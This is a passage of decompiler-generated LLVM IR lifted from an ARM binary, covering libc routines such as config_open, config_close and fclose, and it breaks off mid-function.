  %v2_15dec = phi i32 [ %v1_15e90, %dec_label_pc_15e90 ], [ %v0_15dd4, %dec_label_pc_15dbc ]
  %v1_15ea4 = phi i32 [ %v3_15e94, %dec_label_pc_15e90 ], [ %v3_15e9415, %dec_label_pc_15dbc ]
  %v0_15ea0 = load i32, i32* @r7, align 4
  %v1_15ea0 = inttoptr i32 %v0_15ea0 to i8*
  %v2_15ea0 = load i8, i8* %v1_15ea0, align 1
  %v3_15ea0 = zext i8 %v2_15ea0 to i32
  store i32 %v3_15ea0, i32* %r3.global-to-local, align 4
  %v9_15ea4 = icmp eq i32 %v3_15ea0, %v1_15ea4
  store i1 %v9_15ea4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15ea4, label %dec_label_pc_15eb0, label %bb72

bb72:                                             ; preds = %dec_label_pc_15ea0
  %v2_15ea8 = load i32, i32* @sb, align 4
  %v3_15ea8 = sub i32 %v2_15dec, %v2_15ea8
  %v5_15ea8 = xor i32 %v2_15ea8, %v2_15dec
  %v6_15ea8 = xor i32 %v3_15ea8, %v2_15dec
  %v7_15ea8 = and i32 %v6_15ea8, %v5_15ea8
  %v8_15ea8 = icmp slt i32 %v7_15ea8, 0
  %v9_15ea8 = icmp slt i32 %v3_15ea8, 0
  %v10_15ea8 = icmp eq i32 %v2_15dec, %v2_15ea8
  store i1 %v10_15ea8, i1* %cpsr_z.global-to-local, align 1
  %v2_15eac = xor i1 %v9_15ea8, %v8_15ea8
  br i1 %v2_15eac, label %dec_label_pc_15ddc, label %dec_label_pc_15eb0

dec_label_pc_15eb0:                               ; preds = %dec_label_pc_15ea0, %dec_label_pc_15e90, %bb72, %dec_label_pc_15dbc
  %v0_15eb4 = phi i32 [ %v0_15dd4, %dec_label_pc_15dbc ], [ %v2_15dec, %dec_label_pc_15ea0 ], [ %v1_15e90, %dec_label_pc_15e90 ], [ %v2_15dec, %bb72 ]
  store i32 %v3_15bd4, i32* %r2.global-to-local, align 4
  %v9_15eb4 = icmp eq i32 %v0_15eb4, %v3_15bd4
  store i1 %v9_15eb4, i1* %cpsr_z.global-to-local, align 1
  %v6_15eb8 = icmp slt i32 %v0_15eb4, %v3_15bd4
  br i1 %v6_15eb8, label %dec_label_pc_15ebc, label %dec_label_pc_15ec8

dec_label_pc_15ebc:                               ; preds = %dec_label_pc_15eb0
  %v0_15ebc = load i32, i32* @r8, align 4
  %v1_15ebc = and i32 %v0_15ebc, 1048576
  %v2_15ebc = icmp eq i32 %v1_15ebc, 0
  store i1 %v2_15ebc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15ebc, label %dec_label_pc_15c14.backedge, label %dec_label_pc_15ec4

dec_label_pc_15ec4:                               ; preds = %dec_label_pc_15ebc, %dec_label_pc_15d7c, %.thread, %entry
  br label %dec_label_pc_15ec8

dec_label_pc_15ec8:                               ; preds = %dec_label_pc_15eb0, %dec_label_pc_15c98, %dec_label_pc_15ec4
  %v0_15ec8 = phi i32 [ %v0_15ca8, %dec_label_pc_15c98 ], [ 0, %dec_label_pc_15ec4 ], [ %v0_15eb4, %dec_label_pc_15eb0 ]
  store i32 %v0_15ec8, i32* %r0.global-to-local, align 4
  store i32 %v3_15bb0, i32* @r4, align 4
  store i32 %v6_15bb0, i32* @r5, align 4
  store i32 %v9_15bb0, i32* @r6, align 4
  store i32 %v12_15bb0, i32* @r7, align 4
  store i32 %v15_15bb0, i32* @r8, align 4
  store i32 %v18_15bb0, i32* @sb, align 4
  store i32 %v21_15bb0, i32* @sl, align 4
  store i32 %v24_15bb0, i32* @fp, align 4
  ret i32 %v0_15ec8

; uselistorder directives
  uselistorder i32 %v0_15ec8, { 1, 0 }
  uselistorder i32 %v0_15eb4, { 0, 2, 1 }
  uselistorder i32 %v3_15ea8, { 1, 0 }
  uselistorder i32 %v2_15ea8, { 1, 0, 2 }
  uselistorder i32 %v2_15dec, { 0, 1, 7, 2, 3, 6, 5, 4 }
  uselistorder i32 %v0_15e94.pre, { 0, 2, 1 }
  uselistorder i32 %v5_15e28, { 1, 0, 2, 3 }
  uselistorder i32 %v0_15dd4, { 1, 0, 2 }
  uselistorder i1 %v9_15db4, { 1, 0 }
  uselistorder i32 %v3_15d8c, { 0, 2, 1, 3 }
  uselistorder i1 %v7_15d7c, { 1, 0 }
  uselistorder i1 %v8_15d74, { 1, 0 }
  uselistorder i32 %v3_15d44, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_15d34, { 3, 2, 0, 1, 4, 5, 6, 7 }
  uselistorder i32 %v5_15d1c, { 1, 0, 2 }
  uselistorder i32 %v1_15d0c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_15cf8, { 0, 2, 1, 3 }
  uselistorder i32 %v1_15cf0, { 1, 0 }
  uselistorder i32 %v1_15cdc, { 1, 0 }
  uselistorder i32 %v1_15cd8, { 1, 0 }
  uselistorder i32 %v2_15cb4, { 1, 0 }
  uselistorder i32 %v1_15c98, { 2, 0, 1 }
  uselistorder i32 %v0_15c80, { 1, 0 }
  uselistorder i32 %v1_15c70, { 0, 2, 1 }
  uselistorder i32* %v1_15de0, { 1, 0 }
  uselistorder i1 %v2_15d88, { 1, 0, 2, 3 }
  uselistorder i32 %v1_15bfc, { 2, 0, 1, 3 }
  uselistorder i32 %v1_15bf0, { 2, 1, 0 }
  uselistorder i32 %v3_15bd8, { 1, 2, 0 }
  uselistorder i32 %v3_15bd4, { 2, 1, 0 }
  uselistorder i32 %v1_15bcc, { 2, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 8, 3, 4, 5, 6, 7, 1, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 11, 12, 10, 9, 14, 13, 16, 15, 17, 18, 21, 19, 20, 25, 22, 23, 24, 27, 26, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 12, 13, 14, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i32 1048576, { 1, 0, 2 }
  uselistorder i32 (i32*, i32, i32, i32)* @realloc, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 (i8*)* @strlen, { 1, 0 }
  uselistorder i32 %arg3, { 3, 4, 2, 0, 1, 5, 6 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_15ec8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15eb0, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_15ea0, { 1, 0 }
  uselistorder label %dec_label_pc_15e90, { 1, 0 }
  uselistorder label %bb71, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15e44, { 1, 0 }
  uselistorder label %dec_label_pc_15c14.backedge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15da4, { 1, 0 }
  uselistorder label %dec_label_pc_15d7c, { 1, 0 }
  uselistorder label %dec_label_pc_15d70, { 0, 2, 1 }
  uselistorder label %dec_label_pc_15d34, { 1, 0 }
  uselistorder label %dec_label_pc_15c68, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb64, { 1, 0 }
}

define i32 @__GI_config_close(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r4, align 4
  %v2_15edc = icmp eq i32* %arg1, null
  br i1 %v2_15edc, label %dec_label_pc_15f04, label %dec_label_pc_15ee4

dec_label_pc_15ee4:                               ; preds = %entry
  %v2_15ee4 = load i32, i32* %arg1, align 4
  %v1_15ee8 = inttoptr i32 %v2_15ee4 to i16*
  %v2_15ee8 = call i32 @__GI_fclose(i16* %v1_15ee8)
  %v0_15eec = load i32, i32* @r4, align 4
  %v1_15eec = add i32 %v0_15eec, 20
  %v2_15eec = inttoptr i32 %v1_15eec to i32*
  %v3_15eec = load i32, i32* %v2_15eec, align 4
  %v2_15ef0 = icmp eq i32 %v3_15eec, 0
  br i1 %v2_15ef0, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_15ee4
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_15ee4, %bb
  store i32 89852, i32* @lr, align 4
  %v1_15ef8 = xor i1 %v2_15ef0, true
  call void @__pseudo_cond_branch(i1 %v1_15ef8, i32 ptrtoint (i32* @global_var_135cc.33 to i32))
  %v0_15efc = load i32, i32* @r4, align 4
  store i32 %v0_15efc, i32* @r0, align 4
  %v0_15f00 = call i32 @free()
  br label %dec_label_pc_15f04

dec_label_pc_15f04:                               ; preds = %entry, %bb6
  %v1_15f08 = phi i32 [ 0, %entry ], [ %v0_15f00, %bb6 ]
  ret i32 %v1_15f08

; uselistorder directives
  uselistorder label %dec_label_pc_15f04, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__GI_config_open(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15f18 = load i32, i32* @r4, align 4
  store i32 %v3_15f18, i32* %stack_var_-8, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 -33972), i32* @r1, align 4
  %v0_15f20 = call i32 @__GI_fopen()
  store i32 %v0_15f20, i32* %r0.global-to-local, align 4
  store i32 %v0_15f20, i32* @r4, align 4
  %v2_15f24 = icmp eq i32 %v0_15f20, 0
  br i1 %v2_15f24, label %bb, label %dec_label_pc_15f30

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_15f30:                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_15f38 = call i32 @calloc(i32 1, i32 24)
  store i32 %v2_15f38, i32* %r0.global-to-local, align 4
  %v2_15f3c = icmp eq i32 %v2_15f38, 0
  br i1 %v2_15f3c, label %bb5, label %bb4

bb4:                                              ; preds = %dec_label_pc_15f30
  %v1_15f40 = load i32, i32* @r4, align 4
  %v3_15f40 = inttoptr i32 %v2_15f38 to i32*
  store i32 %v1_15f40, i32* %v3_15f40, align 4
  %v1_15f48.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %bb, %dec_label_pc_15f30, %bb4
  %v1_15f48 = phi i32 [ 0, %bb ], [ 0, %dec_label_pc_15f30 ], [ %v1_15f48.pre, %bb4 ]
  %v2_15f44 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15f44, i32* @r4, align 4
  ret i32 %v1_15f48

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1, 4 }
  uselistorder i32 (i32, i32)* @calloc, { 41, 38, 39, 40, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 1, 0, 26, 25, 24, 23, 3, 2, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4 }
  uselistorder label %bb5, { 2, 1, 0 }
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_15f54 = load i32, i32* @r4, align 4
  store i32 %v3_15f54, i32* %stack_var_-36, align 4
  %v6_15f54 = load i32, i32* @r5, align 4
  %v9_15f54 = load i32, i32* @r6, align 4
  %v12_15f54 = load i32, i32* @r7, align 4
  %v2_15f58 = add i32 %tmp, 52
  %v3_15f58 = inttoptr i32 %v2_15f58 to i32*
  %v4_15f58 = load i32, i32* %v3_15f58, align 4
  store i32 %v4_15f58, i32* %sb.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15f60 = icmp eq i32 %v4_15f58, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* @r8, align 4
  br i1 %v2_15f60, label %dec_label_pc_15f74, label %dec_label_pc_15fd8

dec_label_pc_15f74:                               ; preds = %entry
  %v0_15f74 = call i32 @__aeabi_read_tp()
  store i32 %v0_15f74, i32* %r0.global-to-local, align 4
  %v0_15f78 = load i32, i32* @r5, align 4
  %v1_15f78 = add i32 %v0_15f78, 64
  %v2_15f78 = inttoptr i32 %v1_15f78 to i32*
  %v3_15f78 = load i32, i32* %v2_15f78, align 4
  store i32 %v3_15f78, i32* %r3.global-to-local, align 4
  %v1_15f7c = add i32 %v0_15f74, -1168
  store i32 %v1_15f7c, i32* @r6, align 4
  %v3_15f80 = icmp uge i32 %v3_15f78, %v1_15f7c
  store i1 %v3_15f80, i1* %cpsr_c.global-to-local, align 1
  %v9_15f80 = icmp eq i32 %v3_15f78, %v1_15f7c
  br i1 %v9_15f80, label %dec_label_pc_15fcc, label %dec_label_pc_15f88

dec_label_pc_15f88:                               ; preds = %dec_label_pc_15f74
  %v1_15f88 = add i32 %v0_15f78, 56
  store i32 %v1_15f88, i32* @r7, align 4
  store i32 1, i32* @r1, align 4
  store i32 %v1_15f88, i32* %r2.global-to-local, align 4
  %v0_15f94 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_15f94, i32* @r4, align 4
  %v1_15f98115 = inttoptr i32 %v1_15f88 to i32*
  %v2_15f98116 = load i32, i32* %v1_15f98115, align 4
  store i32 %v2_15f98116, i32* %r3.global-to-local, align 4
  %v3_15f9c118 = icmp uge i32 %v2_15f98116, %v0_15f94
  store i1 %v3_15f9c118, i1* %cpsr_c.global-to-local, align 1
  %v9_15f9c124 = icmp eq i32 %v2_15f98116, %v0_15f94
  br i1 %v9_15f9c124, label %dec_label_pc_15fa4, label %dec_label_pc_15fbc

dec_label_pc_15fa4:                               ; preds = %dec_label_pc_15f88, %dec_label_pc_15fa4.dec_label_pc_15f98_crit_edge
  %v0_15fa4125 = phi i32 [ %v1_15f9c.pre, %dec_label_pc_15fa4.dec_label_pc_15f98_crit_edge ], [ %v0_15f94, %dec_label_pc_15f88 ]
  store i32 %v0_15fa4125, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15fb4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15fb4, label %dec_label_pc_15fb8, label %dec_label_pc_15fa4.dec_label_pc_15f98_crit_edge

dec_label_pc_15fa4.dec_label_pc_15f98_crit_edge:  ; preds = %dec_label_pc_15fa4
  %v0_15f98.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15f9c.pre = load i32, i32* @r4, align 4
  %v1_15f98 = inttoptr i32 %v0_15f98.pre to i32*
  %v2_15f98 = load i32, i32* %v1_15f98, align 4
  store i32 %v2_15f98, i32* %r3.global-to-local, align 4
  %v3_15f9c = icmp uge i32 %v2_15f98, %v1_15f9c.pre
  store i1 %v3_15f9c, i1* %cpsr_c.global-to-local, align 1
  %v9_15f9c = icmp eq i32 %v2_15f98, %v1_15f9c.pre
  br i1 %v9_15f9c, label %dec_label_pc_15fa4, label %dec_label_pc_15fbc

dec_label_pc_15fb8:                               ; preds = %dec_label_pc_15fa4
  %v0_15fb8 = load i32, i32* @r4, align 4
  store i32 %v0_15fb8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15fbc

dec_label_pc_15fbc:                               ; preds = %dec_label_pc_15f88, %dec_label_pc_15fa4.dec_label_pc_15f98_crit_edge, %dec_label_pc_15fb8
  %v0_15fbc = phi i32 [ %v0_15fb8, %dec_label_pc_15fb8 ], [ %v2_15f98116, %dec_label_pc_15f88 ], [ %v2_15f98, %dec_label_pc_15fa4.dec_label_pc_15f98_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15fbc = icmp eq i32 %v0_15fbc, 0
  br i1 %v2_15fbc, label %bb41, label %bb

bb:                                               ; preds = %dec_label_pc_15fbc
  %v1_15fc0 = load i32, i32* @r7, align 4
  store i32 %v1_15fc0, i32* %r0.global-to-local, align 4
  br label %bb41

bb41:                                             ; preds = %dec_label_pc_15fbc, %bb
  %v1_15fc4 = xor i1 %v2_15fbc, true
  call void @__pseudo_cond_branch(i1 %v1_15fc4, i32 ptrtoint (i32* @global_var_14784.527 to i32))
  %v0_15fc8 = load i32, i32* @r6, align 4
  %v1_15fc8 = load i32, i32* @r5, align 4
  %v2_15fc8 = add i32 %v1_15fc8, 64
  %v3_15fc8 = inttoptr i32 %v2_15fc8 to i32*
  store i32 %v0_15fc8, i32* %v3_15fc8, align 4
  %v0_15fcc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15fcc

dec_label_pc_15fcc:                               ; preds = %dec_label_pc_15f74, %bb41
  %v0_15fcc = phi i32 [ %v0_15f78, %dec_label_pc_15f74 ], [ %v0_15fcc.pre, %bb41 ]
  %v1_15fcc = add i32 %v0_15fcc, 60
  %v2_15fcc = inttoptr i32 %v1_15fcc to i32*
  %v3_15fcc = load i32, i32* %v2_15fcc, align 4
  %v1_15fd0 = add i32 %v3_15fcc, 1
  store i32 %v1_15fd0, i32* %r3.global-to-local, align 4
  store i32 %v1_15fd0, i32* %v2_15fcc, align 4
  %v0_15fd8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15fd8

dec_label_pc_15fd8:                               ; preds = %entry, %dec_label_pc_15fcc
  %v1_15fe0 = phi i32 [ %tmp, %entry ], [ %v0_15fd8.pre, %dec_label_pc_15fcc ]
  %v1_15fd8 = inttoptr i32 %v1_15fe0 to i16*
  %v2_15fd8 = load i16, i16* %v1_15fd8, align 2
  %v3_15fd8 = zext i16 %v2_15fd8 to i32
  store i32 %v3_15fd8, i32* %r3.global-to-local, align 4
  %v1_15fdc = and i32 %v3_15fd8, 64
  %v2_15fdc = icmp eq i32 %v1_15fdc, 0
  br i1 %v2_15fdc, label %bb43, label %bb42

bb42:                                             ; preds = %dec_label_pc_15fd8
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_15fd8, %bb42
  %storemerge = phi i32 [ %v1_15fe0, %bb42 ], [ %v1_15fdc, %dec_label_pc_15fd8 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 90088, i32* @lr, align 4
  %v1_15fe4 = xor i1 %v2_15fdc, true
  call void @__pseudo_cond_branch(i1 %v1_15fe4, i32 ptrtoint (i32* @global_var_16e28.618 to i32))
  %v0_15fe8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_15fe8, i32* %fp.global-to-local, align 4
  %v0_15fec = load i32, i32* @r5, align 4
  %v1_15fec = add i32 %v0_15fec, 4
  %v2_15fec = inttoptr i32 %v1_15fec to i32*
  %v3_15fec = load i32, i32* %v2_15fec, align 4
  store i32 %v3_15fec, i32* %r0.global-to-local, align 4
  %v1_15ff0 = call i32 @__GI___libc_close(i32 %v3_15fec)
  store i32 %v1_15ff0, i32* %r0.global-to-local, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_15ff8 = load i32, i32* @r8, align 4
  %v2_15ff8 = add i32 %v0_15ff8, 160
  %v3_15ff8 = inttoptr i32 %v2_15ff8 to i32*
  %v4_15ff8 = load i32, i32* %v3_15ff8, align 4
  store i32 %v4_15ff8, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_15ffc = icmp slt i32 %v1_15ff0, 0
  br i1 %v1_15ffc, label %bb44, label %bb45

bb44:                                             ; preds = %bb43
  store i32 -1, i32* %fp.global-to-local, align 4
  br label %bb45

bb45:                                             ; preds = %bb43, %bb44
  %v1_16004 = add i32 %v4_15ff8, 8
  %v2_16004 = inttoptr i32 %v1_16004 to i32*
  %v3_16004 = load i32, i32* %v2_16004, align 4
  store i32 %v3_16004, i32* %r3.global-to-local, align 4
  %v0_16008 = call i32 @__aeabi_read_tp()
  store i32 %v0_16008, i32* %r0.global-to-local, align 4
  %v1_1600c = add i32 %v0_16008, -1168
  store i32 %v1_1600c, i32* %sl.global-to-local, align 4
  %v0_16010 = load i32, i32* %r3.global-to-local, align 4
  %v3_16010 = icmp uge i32 %v0_16010, %v1_1600c
  store i1 %v3_16010, i1* %cpsr_c.global-to-local, align 1
  %v9_16010 = icmp eq i32 %v0_16010, %v1_1600c
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_16018 = load i32, i32* @r5, align 4
  %v2_16018 = add i32 %v1_16018, 4
  %v3_16018 = inttoptr i32 %v2_16018 to i32*
  store i32 -1, i32* %v3_16018, align 4
  br i1 %v9_16010, label %dec_label_pc_16060, label %dec_label_pc_16020

dec_label_pc_16020:                               ; preds = %bb45
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_16024 = load i32, i32* @r7, align 4
  store i32 %v0_16024, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_1602c108 = inttoptr i32 %v0_16024 to i32*
  %v2_1602c109 = load i32, i32* %v1_1602c108, align 4
  store i32 %v2_1602c109, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_16030111 = icmp eq i32 %v2_1602c109, 0
  br i1 %v9_16030111, label %dec_label_pc_16038, label %dec_label_pc_16050

dec_label_pc_16038:                               ; preds = %dec_label_pc_16020, %dec_label_pc_16038.dec_label_pc_1602c_crit_edge
  %v0_16038112 = phi i32 [ %v1_16030.pre, %dec_label_pc_16038.dec_label_pc_1602c_crit_edge ], [ 0, %dec_label_pc_16020 ]
  store i32 %v0_16038112, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16048 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16048, label %dec_label_pc_1604c, label %dec_label_pc_16038.dec_label_pc_1602c_crit_edge

dec_label_pc_16038.dec_label_pc_1602c_crit_edge:  ; preds = %dec_label_pc_16038
  %v0_1602c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16030.pre = load i32, i32* @r4, align 4
  %v1_1602c = inttoptr i32 %v0_1602c.pre to i32*
  %v2_1602c = load i32, i32* %v1_1602c, align 4
  store i32 %v2_1602c, i32* %r3.global-to-local, align 4
  %v3_16030 = icmp uge i32 %v2_1602c, %v1_16030.pre
  store i1 %v3_16030, i1* %cpsr_c.global-to-local, align 1
  %v9_16030 = icmp eq i32 %v2_1602c, %v1_16030.pre
  br i1 %v9_16030, label %dec_label_pc_16038, label %dec_label_pc_16050

dec_label_pc_1604c:                               ; preds = %dec_label_pc_16038
  %v0_1604c = load i32, i32* @r4, align 4
  store i32 %v0_1604c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16050

dec_label_pc_16050:                               ; preds = %dec_label_pc_16020, %dec_label_pc_16038.dec_label_pc_1602c_crit_edge, %dec_label_pc_1604c
  %v0_16050 = phi i32 [ %v0_1604c, %dec_label_pc_1604c ], [ %v2_1602c109, %dec_label_pc_16020 ], [ %v2_1602c, %dec_label_pc_16038.dec_label_pc_1602c_crit_edge ]
  %v1_16050 = phi i32 [ %v0_1604c, %dec_label_pc_1604c ], [ 0, %dec_label_pc_16020 ], [ %v1_16030.pre, %dec_label_pc_16038.dec_label_pc_1602c_crit_edge ]
  %v3_16050 = icmp uge i32 %v0_16050, %v1_16050
  store i1 %v3_16050, i1* %cpsr_c.global-to-local, align 1
  %v9_16050 = icmp eq i32 %v0_16050, %v1_16050
  br i1 %v9_16050, label %bb47, label %bb46

bb46:                                             ; preds = %dec_label_pc_16050
  %v1_16054 = load i32, i32* @r7, align 4
  store i32 %v1_16054, i32* %r0.global-to-local, align 4
  br label %bb47

bb47:                                             ; preds = %dec_label_pc_16050, %bb46
  %v1_16058 = xor i1 %v9_16050, true
  call void @__pseudo_cond_branch(i1 %v1_16058, i32 ptrtoint (i32* @global_var_14784.527 to i32))
  %v0_1605c = load i32, i32* %sl.global-to-local, align 4
  %v1_1605c = load i32, i32* @r7, align 4
  %v2_1605c = add i32 %v1_1605c, 8
  %v3_1605c = inttoptr i32 %v2_1605c to i32*
  store i32 %v0_1605c, i32* %v3_1605c, align 4
  br label %dec_label_pc_16060

dec_label_pc_16060:                               ; preds = %bb45, %bb47
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_16064 = load i32, i32* @r8, align 4
  %v2_16064 = add i32 %v0_16064, 160
  %v3_16064 = inttoptr i32 %v2_16064 to i32*
  %v4_16064 = load i32, i32* %v3_16064, align 4
  store i32 %v4_16064, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_1606c = add i32 %v0_16064, 12
  %v3_1606c = inttoptr i32 %v2_1606c to i32*
  %v4_1606c = load i32, i32* %v3_1606c, align 4
  store i32 %v4_1606c, i32* %r2.global-to-local, align 4
  %v1_16070 = add i32 %v4_16064, 4
  %v2_16070 = inttoptr i32 %v1_16070 to i32*
  %v3_16070 = load i32, i32* %v2_16070, align 4
  store i32 %v3_16070, i32* %r1.global-to-local, align 4
  %v1_16074 = inttoptr i32 %v4_1606c to i32*
  %v2_16074 = load i32, i32* %v1_16074, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16078 = icmp eq i32 %v3_16070, 0
  %v1_1607c = add i32 %v2_16074, 1
  store i32 %v1_1607c, i32* %r3.global-to-local, align 4
  store i32 %v1_1607c, i32* %v1_16074, align 4
  br i1 %v2_16078, label %dec_label_pc_16088, label %dec_label_pc_160e8

dec_label_pc_16088:                               ; preds = %dec_label_pc_16060
  %v0_16088 = load i32, i32* %r1.global-to-local, align 4
  %v1_16088 = load i32, i32* %r0.global-to-local, align 4
  %v2_16088 = add i32 %v1_16088, 8
  %v3_16088 = inttoptr i32 %v2_16088 to i32*
  store i32 %v0_16088, i32* %v3_16088, align 4
  %v0_1608c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1608c, i32* @r7, align 4
  br label %dec_label_pc_16090

dec_label_pc_16090:                               ; preds = %dec_label_pc_160c0.dec_label_pc_16090_crit_edge, %dec_label_pc_16088
  %v0_16090 = phi i32 [ %v0_16090.pre, %dec_label_pc_160c0.dec_label_pc_16090_crit_edge ], [ %v0_1608c, %dec_label_pc_16088 ]
  %v1_16090 = inttoptr i32 %v0_16090 to i32*
  %v2_16090 = load i32, i32* %v1_16090, align 4
  store i32 %v2_16090, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_16090, i32* %r2.global-to-local, align 4
  %v2_1609c96 = load i32, i32* %v1_16090, align 4
  store i32 %v2_1609c96, i32* %r3.global-to-local, align 4
  %v3_160a098 = icmp uge i32 %v2_1609c96, %v2_16090
  store i1 %v3_160a098, i1* %cpsr_c.global-to-local, align 1
  %v9_160a0104 = icmp eq i32 %v2_1609c96, %v2_16090
  br i1 %v9_160a0104, label %dec_label_pc_160a8, label %dec_label_pc_160c0

dec_label_pc_160a8:                               ; preds = %dec_label_pc_16090, %dec_label_pc_160a8.dec_label_pc_1609c_crit_edge
  %v0_160a8105 = phi i32 [ %v1_160a0.pre, %dec_label_pc_160a8.dec_label_pc_1609c_crit_edge ], [ %v2_16090, %dec_label_pc_16090 ]
  store i32 %v0_160a8105, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_160b8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_160b8, label %dec_label_pc_160bc, label %dec_label_pc_160a8.dec_label_pc_1609c_crit_edge

dec_label_pc_160a8.dec_label_pc_1609c_crit_edge:  ; preds = %dec_label_pc_160a8
  %v0_1609c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_160a0.pre = load i32, i32* @r4, align 4
  %v1_1609c = inttoptr i32 %v0_1609c.pre to i32*
  %v2_1609c = load i32, i32* %v1_1609c, align 4
  store i32 %v2_1609c, i32* %r3.global-to-local, align 4
  %v3_160a0 = icmp uge i32 %v2_1609c, %v1_160a0.pre
  store i1 %v3_160a0, i1* %cpsr_c.global-to-local, align 1
  %v9_160a0 = icmp eq i32 %v2_1609c, %v1_160a0.pre
  br i1 %v9_160a0, label %dec_label_pc_160a8, label %dec_label_pc_160c0

dec_label_pc_160bc:                               ; preds = %dec_label_pc_160a8
  %v0_160bc = load i32, i32* @r4, align 4
  store i32 %v0_160bc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_160c0

dec_label_pc_160c0:                               ; preds = %dec_label_pc_16090, %dec_label_pc_160a8.dec_label_pc_1609c_crit_edge, %dec_label_pc_160bc
  %v0_160c8 = phi i32 [ %v0_160bc, %dec_label_pc_160bc ], [ %v2_1609c96, %dec_label_pc_16090 ], [ %v2_1609c, %dec_label_pc_160a8.dec_label_pc_1609c_crit_edge ]
  %v1_160c0 = phi i32 [ %v0_160bc, %dec_label_pc_160bc ], [ %v2_16090, %dec_label_pc_16090 ], [ %v1_160a0.pre, %dec_label_pc_160a8.dec_label_pc_1609c_crit_edge ]
  %v3_160c0 = icmp uge i32 %v0_160c8, %v1_160c0
  store i1 %v3_160c0, i1* %cpsr_c.global-to-local, align 1
  %v9_160c0 = icmp eq i32 %v0_160c8, %v1_160c0
